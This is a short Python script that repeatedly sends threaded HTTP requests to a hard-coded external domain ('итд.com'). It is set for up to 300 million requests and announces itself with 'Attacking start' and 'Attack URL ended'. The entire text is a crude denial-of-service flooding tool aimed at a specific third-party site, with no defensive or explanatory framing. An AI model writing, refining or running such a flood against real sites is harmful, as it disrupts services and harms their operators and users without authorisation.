import requests
import threading
import time

def send_request(url):
    try:
        response = requests.get(url)
        print(f"Status: {response.status_code}")
    except Exception as e:
        print(f"Error: {e}")

Hear = "https://итд.com"

MAX_REQUESTS = 300000000

print("Attacking start")

threads = []
for i in range(MAX_REQUESTS):
    thread = threading.Thread(target=send_request, args=(Hear,))
    threads.append(thread)
    thread.start()
    time.sleep(0.5)

for thread in threads:
    thread.join()

print("Attack URL ended")
